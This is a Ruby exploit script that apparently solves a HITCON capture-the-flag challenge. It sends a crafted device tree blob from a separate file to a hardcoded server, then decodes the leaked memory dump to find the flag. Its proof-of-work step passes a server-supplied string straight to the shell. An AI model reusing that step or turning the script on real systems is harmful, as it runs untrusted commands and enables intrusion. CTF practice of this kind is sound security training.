#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

host, port = '18.178.77.213', 3154
@local = false
@p = ''
if ARGV.empty?
  host = '127.0.0.1'; @local = true
  # $z = Tubes::Process.new(@p)
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new(host, port)
def z;$z;end
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def libc; @libc ||= ELF.new('./libc.so.6', checksec: false); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = :amd64
# debug!

def pow
  z.gets "Proof of Work - Give me the token of:\n"
  cmd = z.gets.strip
  z.puts `#{cmd}`
end
pow

DTB = 'hack.dtb'
# DTB = '../release/example.dtb'
z.gets "Give me your dtb, size in bytes? (MAX: 20K)\n"
payload = IO.binread(DTB)
z.puts payload.size
z.write payload

z.gets 'Hacker yo'
data = z.gets 'End'
log.info "Got #{data.size} bytes of data"
IO.binwrite('a.gz', data.scan(/\] 0x.*$/).map { |c| flat(c.split[1..-1].map {|v|v.to_i(16)}) }.join)
`gunzip a.gz`
a = IO.binread('a')
p a[a.index('hitcon'), 100]
`rm a`

z.interact
